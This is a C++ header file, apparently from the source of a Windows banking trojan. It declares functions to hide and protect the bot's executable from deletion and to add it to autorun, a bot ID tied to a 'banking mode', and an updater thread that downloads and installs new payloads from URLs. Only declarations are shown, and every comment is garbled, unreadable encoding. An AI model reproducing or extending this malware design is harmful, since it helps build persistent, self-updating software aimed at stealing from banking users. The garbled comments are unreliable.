//---------------------------------------------------------------------------
//  �������� ������ ����, ������������ � ���� ������� ������
//---------------------------------------------------------------------------

#ifndef BotCoreH
#define BotCoreH
//---------------------------------------------------------------------------

// ���������� ������ ��� ������ � WINAPI � ����
#include "GetApi.h"

// ������ ��� ������ � �������
#include "Memory.h"

// ������ ��� ������ �� ��������
#include "Strings.h"

// ������ ����������
#include "Crypt.h"

// ������� ��������� ����
#include "Config.h"


// ������ ������� ������
#include "Utils.h"

// ������ ��� ������ � HTTP
#include "BotHTTP.h"


//*****************************************************************************
//  ���� ������ �� ���������� � ����� ����������
//  ���� ������ ������������� ������ ������
//  ������ ���������� � ���� ��� �������������� ������
//  �������� ���������� ����
//  ��-�� ���� �� ����������� ������������� ��������������
//  ������� ������ �� ����� ������ �������� ���� ������
//*****************************************************************************
#include "Modules.h"



/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/


//*****************************************************************************
//  Bot - ������ ��� ����������� ������ ���� ����
//*****************************************************************************
namespace BOT
{
	//----------------------------------------------------
	//  Initialize - ������� �������������� ����������
	//				 ��������� ����
	//----------------------------------------------------
    void Initialize();


	//----------------------------------------------------
	// ������� ���������� ������� ������� ����
	//
	// SubDir - ����������, ������� ����� �������� �
	//          ����������� ����������.
	//          �� ������ ���������� �� �����, �� ������
	//			�� �������������
	//
	// FileName - ��� �����, ������� ����� ��������� �
	//			  ����������� ��������
	//----------------------------------------------------
	PCHAR GetWorkPath(PCHAR SubDir = NULL, PCHAR FileName = NULL);

	//----------------------------------------------------
	//  GetWorkPathInSysDrive - ������ ������� GetWorkPath.
	//  	������� �� ����� �� ��� � ���, ��� �����
	//      �������� � ����� ���������� �����
	//----------------------------------------------------
	PCHAR GetWorkPathInSysDrive(PCHAR SubDir = NULL, PCHAR FileName = NULL);

	//----------------------------------------------------
	//  GetWorkFolderHash - ������� ���������� ���
	//  	                   ����� ������� �����
	//----------------------------------------------------
	DWORD GetWorkFolderHash();

	//----------------------------------------------------
	//  GetBotFileName - ������� ���������� ��� ����� ����
	//----------------------------------------------------
	PCHAR GetBotExeName();

	//----------------------------------------------------
	//  GetBotExeNameHash - ������� ���������� ��� ���
	//						����� ����
	//----------------------------------------------------
    DWORD GetBotExeNameHash();

	//----------------------------------------------------
	//  GetBotFullExeName - ������� ���������� ������ ���
	//						����� ����
	//----------------------------------------------------
	PCHAR GetBotFullExeName();

	//----------------------------------------------------
	// ������� �������� ��� ���� �� ��������
	//----------------------------------------------------
	void Protect(PCHAR FileName);

	//----------------------------------------------------
	// ������� ������� ������ � ��� ����� ����
	//----------------------------------------------------
	void Unprotect();

	//----------------------------------------------------
	// AddToAutoRun - ������� ��������� ��� � ������������
	//----------------------------------------------------
	bool AddToAutoRun(PCHAR FileName);

	//----------------------------------------------------
	//  BotExeMD5 - ������� ���������� MD5 ��� ��� ����
	//----------------------------------------------------
    string BotExeMD5();

}

//��� ����, ���������������� � ������� BOT::Initialize(), ����� �������� ���� ����� ������� ������� 
//����� ������� SetBankingMode()
extern char BOT_UID[128];



//************************************************************
//	TBotUpdater - ����� ��������������� ���������� ����
//************************************************************
class TBotUpdater : public TBotThread
{
private:
	void Update(DWORD &UpdateInterval);
	void DownloadAndSetup(const string &FileURL, const string &FileName);
protected:
    void DoExecute();
public:
	DWORD Interval;
    TBotUpdater();

};

//---------------------------------------------------------------------------
#endif
